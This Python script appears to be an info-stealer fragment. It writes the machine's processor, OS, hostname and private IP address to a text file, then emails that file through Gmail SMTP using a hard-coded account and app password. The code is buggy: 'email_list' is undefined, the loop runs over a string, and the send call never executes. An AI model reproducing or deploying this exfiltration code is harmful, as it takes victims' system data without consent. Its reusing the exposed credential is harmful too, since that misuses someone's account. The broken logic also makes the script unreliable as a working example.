#Libraries

from email.mime.text import  MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform


system_information = "systeminfo.txt"

file_path = "C:\\Users\\user\\Desktop\\pythonProject3"
extend = "\\"


def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)

        f.write("Processor: " + platform.processor() + "\n")
        f.write("System: " + platform.system() + " " + platform.version() + "\n")
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")



computer_information()


# Setup port number and server name

smtp_port = 587
smtp_server = "smtp.gmail.com"

email_from = "bodmantest@gmail.com"
email_to = "bodmantest@gmail.com"


pwd = "yqnqriddqiiffagi"

subject = "My new logs"


def send_emails(email_to):

    for person in email_to:
        body = "Can you have it"

        msg = MIMEMultipart()
        msg["From"] = email_from
        msg["To"] = email_list
        msg["Subject"] = subject

        msg.attach(MIMEText(body, "plain"))

        filename = "systeminfo.txt"

        attachment = open(filename, "rb")

        attachment_package = MIMEBase("application", "octet-stream")
        attachment_package.set_payload((attachment).read())
        encoders.encode_base64(attachment_package)
        attachment_package.add_header("Content-Disposition", "attachment; filename=" + filename)
        msg.attach(attachment_package)

        text = msg.as_string()

        TIE_server = smtplib.SMTP(smtp_server, smtp_port)

        TIE_server.starttls()
        TIE_server.login(email_from, pwd)

        TIE_server.sendmail(email_from, email_to, text)

    TIE_server.quit()



    send_emails(email_list)